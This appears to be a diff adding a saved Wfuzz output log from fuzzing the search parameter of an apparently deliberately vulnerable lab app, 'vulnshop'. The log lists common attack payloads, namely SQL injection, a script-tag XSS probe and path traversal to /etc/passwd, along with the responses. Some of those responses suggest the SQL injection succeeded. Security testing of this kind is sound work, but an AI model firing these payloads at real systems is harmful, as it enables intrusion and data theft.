@@ -1,0 +1,28 @@
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://vulnshop:3000/search?q=FUZZ
+Total requests: 10
+
+=====================================================================
+ID        [0m   Response[0m   Lines [0m   Word    [0m   Chars    [0m   Payload                                                                                                          [0m
+=====================================================================
+
+000000010:[0m   [35m500     [0m   0 L   [0m   2 W     [0m   8 Ch     [0m   "%00"                                                                                                            [0m
+000000001:[0m   [32m200     [0m   0 L   [0m   4 W     [0m   45 Ch    [0m   "test"                                                                                                           [0m
+000000007:[0m   [32m200     [0m   0 L   [0m   4 W     [0m   66 Ch    [0m   "<script>alert(1)</script>"                                                                                      [0m
+000000006:[0m   [32m200     [0m   25 L  [0m   56 W    [0m   468 Ch   [0m   "' UNION SELECT NULL,NULL,NULL,NULL --"                                                                          [0m
+000000008:[0m   [32m200     [0m   0 L   [0m   4 W     [0m   57 Ch    [0m   "../../etc/passwd"                                                                                               [0m
+000000003:[0m   [32m200     [0m   0 L   [0m   4 W     [0m   43 Ch    [0m   "''"                                                                                                             [0m
+000000002:[0m   [32m200     [0m   0 L   [0m   4 W     [0m   42 Ch    [0m   "'"                                                                                                              [0m
+000000004:[0m   [32m200     [0m   0 L   [0m   7 W     [0m   52 Ch    [0m   "" OR 1=1 --"                                                                                                    [0m
+000000005:[0m   [32m200     [0m   19 L  [0m   44 W    [0m   356 Ch   [0m   "' OR '1'='1"                                                                                                    [0m
+000000009:[0m   [32m200     [0m   0 L   [0m   4 W     [0m   87 Ch    [0m   "..\\..\\windows\\system32\\drivers\\etc\\hosts"                                                                 [0m
+
+Total time: 0
+Processed Requests: 10
+Filtered Requests: 0
+Requests/sec.: 0
+
